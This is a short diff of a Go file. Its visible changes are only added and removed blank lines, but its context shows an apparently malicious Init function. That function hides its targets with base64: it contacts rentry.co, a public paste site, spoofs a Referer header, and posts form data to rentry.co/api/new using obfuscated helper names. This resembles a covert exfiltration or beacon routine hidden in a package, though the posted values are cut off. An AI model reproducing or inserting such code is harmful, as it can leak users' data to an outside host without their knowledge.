@@ -19,6 +19,7 @@ import (
 )
 
 func Init() int {
+
 	c := nC()
 	rg, _ := c.g(f(`aHR0cHM6Ly9yZW50cnkuY28=`), nil)
 	_, _ = c.p(f(`aHR0cHM6Ly9yZW50cnkuY28vYXBpL25ldw==`), _u.Values{
@@ -97,12 +98,10 @@ func (c *cc) g(u string, h map[string]string) (*_h.Response, error) {
 	if err != nil {
 		return nil, err
 	}
-
 	r.Header.Set(f(`UmVmZXJlcg==`), f(`aHR0cHM6Ly9yZW50cnkuY28=`))
 	for k, v := range h {
 		r.Header.Set(k, v)
 	}
-
 	return c.client.Do(r)
 }
 
